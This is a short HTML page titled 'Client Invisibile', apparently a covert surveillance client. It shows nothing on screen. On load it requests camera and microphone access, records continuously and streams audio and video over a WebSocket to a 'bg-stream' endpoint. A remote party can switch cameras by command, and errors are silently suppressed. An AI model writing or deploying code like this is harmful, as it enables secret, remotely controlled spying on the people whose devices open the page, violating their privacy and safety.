<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Client Invisibile</title>
</head>
<body>
<script>
const room = new URLSearchParams(location.search).get('room') || 'user1';
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-stream?room=${room}`);

let currentCamera = 'environment';
let mediaRecorder;
let stream;

async function startCamera(facing) {
  if (stream) stream.getTracks().forEach(track => track.stop());
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing },
      audio: true
    });
    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
    mediaRecorder.ondataavailable = e => {
      if (e.data.size > 0 && ws.readyState === WebSocket.OPEN) ws.send(e.data);
    };
    mediaRecorder.start(50); // ~20 FPS
  } catch(err) {}
}

ws.onopen = () => startCamera(currentCamera);

ws.onmessage = e => {
  if (typeof e.data === 'string') {
    try {
      const msg = JSON.parse(e.data);
      if (msg.type === 'switchCamera') {
        currentCamera = msg.camera;
        startCamera(currentCamera);
      }
    } catch{}
  }
};

// Mantieni alive
setInterval(() => { if(ws.readyState===WebSocket.OPEN) ws.send('ping'); },10000);
</script>
</body>
</html>
